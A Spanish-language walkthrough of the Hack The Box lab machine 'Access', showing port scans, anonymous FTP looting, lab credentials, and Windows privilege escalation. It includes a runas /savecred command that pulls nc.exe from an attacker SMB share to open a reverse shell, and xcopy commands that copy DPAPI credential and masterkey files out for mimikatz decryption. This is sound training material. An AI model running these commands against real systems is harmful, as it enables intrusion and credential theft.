# Access

## Tabla de Contenido <!-- omit from toc -->

- [Introducción](#introducción)
  - [Técnicas vistas / Tags](#técnicas-vistas--tags)
  - [Estadísticas](#estadísticas)
- [Reconocimiento](#reconocimiento)
  - [Escaneo de host](#escaneo-de-host)
    - [Escaneo completo de puertos](#escaneo-completo-de-puertos)
    - [Escaneo específico](#escaneo-específico)
- [Enumeración](#enumeración)
  - [Servicios](#servicios)
    - [ftp - 21](#ftp---21)
    - [telnet - 23](#telnet---23)
- [Explotación](#explotación)
- [Post Explotación](#post-explotación)
  - [Enumeración](#enumeración-1)
  - [Escalación de privilegios](#escalación-de-privilegios)
- [Conclusión](#conclusión)
- [Notas adicionales](#notas-adicionales)
- [Referencias](#referencias)


## Introducción


### Técnicas vistas / Tags

- Windows - Privilege Escalation: RunAs
- Windows - Privilege Escalation: DPAPI abuse
- Técnica 3

### Estadísticas

| Característica | Descripción |
|---|---|
| Nombre | [Access](https://www.hackthebox.com/home/machines/profile/156) |
| OS | Windows |
| Dificultad oficial | Easy |
| Dificultad de comunidad | ![Dificultad](images/difficulty.png) |
| Puntos | 20 |
| Creadores | [egre55](https://www.hackthebox.com/home/users/profile/1190) |

## Reconocimiento

### Escaneo de host

#### Escaneo completo de puertos

```bash
└─$ sudo nmap -sS --min-rate 5000 -open -vvv -p- -n -Pn -oG nmap/all_ports_ss $TARGET
[sudo] password for srrequiem:
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-28 14:36 EDT
Initiating SYN Stealth Scan at 14:36
Scanning 10.10.10.98 [65535 ports]
Discovered open port 23/tcp on 10.10.10.98
Discovered open port 21/tcp on 10.10.10.98
Discovered open port 80/tcp on 10.10.10.98
Completed SYN Stealth Scan at 14:37, 26.32s elapsed (65535 total ports)
Nmap scan report for 10.10.10.98
Host is up, received user-set (0.060s latency).
Scanned at 2022-10-28 14:36:34 EDT for 26s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 127
23/tcp open  telnet  syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.39 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 22 (968B)
```

#### Escaneo específico

```bash
└─$ nmap -sCV -p 21,23,80 -n -Pn -oN nmap/targeted $TARGET
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-28 14:45 EDT
Stats: 0:00:27 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 14:45 (0:00:14 remaining)
Nmap scan report for 10.10.10.98
Host is up (0.060s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst:
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
| http-methods:
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 201.67 seconds
```

## Enumeración

### Servicios

#### ftp - 21

Se cuenta con acceso al servidor FTP mediante el usuario `anonymous`, el cuál cuenta con permsisos para descargar archivos por lo que se puede realizar una descarga recursiva de los archivos.

```bash
wget -r --no-passive ftp://anonymous:anonymous@10.10.10.98/
```

Bajo la siguiente estructura:

```bash
.
├── Backups
│   └── backup.mdb # Base de datos de Microsoft Access
└── Engineer
    └── Access Control.zip # Zip protegido con contraseña
```

#### telnet - 23

Se presenta un login, el cual se intentó acceder mediante credenciales por default. Sin éxito alguno.

![Login de telnet](images/enum_1.png)

## Explotación

Mediante el uso de `dbeaver` se puede interactuar de manera visual con la base de datos (`backup.mdb`), encontrando así en la tabla `auth_user` una contraseña potencial para descomprimir `Access Control.zip`.

![Contraseña de zip](images/exploit_1.png)

Descomprimiendo el archivo mediante:

```bash
7z x Access\ Control.zip -paccess4u@security
```

Identificando el archivo con `file` se visualiza que es algo así como una bandeja de entrada e un email:

```bash
└─$ file Access\ Control.pst
Access Control.pst: Microsoft Outlook email folder (>=2003)
```

Después de buscar un intérprete para abrir dicho archivo, se encontró una [herramienta online](https://goldfynch.com/pst-viewer/index.html) que permite su visualización.

![Contraseña de usuario](images/exploit_2.png)

A lo que presenta una cuenta y contraseña para el login de telnet encontrado previamente. Obteniendo así acceso a la máquina. (`security:4Cc3ssC0ntr0ller`)

![Acceso a la máquina](images/exploit_3.png)

## Post Explotación

### Enumeración

Al ejecutar `cmdkey /list` para verificar la existencia de credenciales guardadas en la máquina se encontró que se encontraban credenciales del usuario `Administrator`.

![Credenciales guardadas](images/post_1.png)

### Escalación de privilegios

Al seguir el paso a paso de [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---runas) se puede impersonar el usuario con credenciales guardadas, ejecutando el comando `runas`.

Por lo que después de compartir acceso mediante un servidor de `smb` se pudo ejecutar el binario `nc.exe` para obtener una reverse shell con:

```bash
runas /savecred /user:ACCESS\Administrator "\\10.10.14.12\smbFolder\nc.exe -e cmd.exe 10.10.14.12 1234"
```

![Acceso como Administrator](images/post_2.png)

1. Ejecución de comando `runas`.
2. Servidor `smb`.
3. Obtención de reverse shell como `Administrator`.

## Conclusión


## Notas adicionales

Al verificar la resolución de la máquina con la de [0xdf](https://0xdf.gitlab.io/2019/03/02/htb-access.html#privesc-to-administrator) encontré que era posible extraer las contraseñas dado que se encuentran cacheadas, siguiendo el writeup oficial de la máquina y el post de [harmj0y](https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/) para abusar de DPAPI.

Para lograr la extracción de la API es necesario identificar los archivos de las credenciales y las masterkeys de los cuales los archivos de las credenciales son cadenas de 32 caracteres y las masterkeys son GUIDs, cuentan con el atributo de "Archivos de sistema" por lo que se tendría que usar `dir /AS` para identificarlos.

Lugares a buscar:

```powershell
dir /S /AS C:\Users\security\AppData\Local\Microsoft\Vault
​dir /S /AS C:\Users\security\AppData\Local\Microsoft\Credentials
dir /S /AS C:\Users\security\AppData\Local\Microsoft\Protect
​dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Vault
​dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Credentials
dir /S /AS C:\Users\security\AppData\Roaming\Microsoft\Protect
```

Identificando así los archivos a ocupar para poder encontrar la contraseña del usuario loggeado:

![Archivos mimikatz](images/additional_1.png)

Una vez identificado, se extrajeron los archivos haciendo uso de un servidor `smb` y de `xcopy /h` (dado que son archivos de sistema) mediante:

```powershell
xcopy /h C:\Users\security\AppData\Roaming\Microsoft\Credentials\51AB168BE4BDB3A603DADE4F8CA81290 \\10.10.14.12\smbFolder

xcopy /h C:\Users\security\AppData\Roaming\Microsoft\Protect\S-1-5-21-953262931-566350628-63446256-1001\0792c32e-48a5-4fe3-8b43-d93d64590580 \\10.10.14.12\smbFolder
```

Para después descifrar la masterkey haciendo uso de mimikatz y del comando `dpapi::​masterkey​`.



## Referencias

- [Dbeaver](https://dbeaver.io/) (Disponible también mediante `apt install dbeaver`).
- [PSTViewer](https://goldfynch.com/pst-viewer/index.html).
- [PayloadAllTheThings - RunAs](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---runas).
- [0xdf Access writeup](https://0xdf.gitlab.io/2019/03/02/htb-access.html).
- [Operational Guidance for Offensive User DPAPI Abuse](https://blog.harmj0y.net/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/).
- [Microsoft - xcopy](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/xcopy)